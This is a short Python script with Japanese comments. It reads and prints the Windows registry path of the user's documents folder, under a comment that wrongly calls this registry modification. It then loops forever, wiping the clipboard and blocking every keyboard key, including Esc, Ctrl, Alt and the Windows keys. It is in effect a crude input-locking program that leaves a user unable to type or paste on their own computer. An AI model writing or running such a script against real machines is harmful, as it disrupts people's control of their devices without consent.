import keyboard
import time
import pyperclip
import os

#レジストリ改変
import winreg
path = r'Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders'
key = winreg.OpenKeyEx(winreg.HKEY_CURRENT_USER, path)
data, regtype = winreg.QueryValueEx(key, 'Personal')
print('種類:', regtype)
print('データ:', data)
winreg.CloseKey(key)  # key.Close() と書いても同じ
#キーボード＆コピペ無効化


AllKeySet = {
    'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z',
    'A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z',
    '!','"','#','$','%','&',"'",'(',')','=','~','|','-','^','\\','@','[',';',':',']',',','`','{','}','<','>','?','_',
    '0','1','2','3','4','5','6','7','8','9','.','+','*','/',"num lock",
    "esc","f1","f2","f3","f4","f5","f6","f7","f8","f9","f10","f11","f12","print screen","scroll lock","pause","sys req",
    "insert","delete","home","end","page up","page down",
    "right","down","left","up",
    "半角/全角","tab","caps lock","shift","ctrl","left windows","alt","無変換","space",
    "変換","ひらがな","right alt","right windows","menu","right ctrl","right shift","enter","backspace"
}
# すべてのキー入力を無効化
while True:
    pyperclip.copy('')
    for key in AllKeySet:
        keyboard.block_key(key)
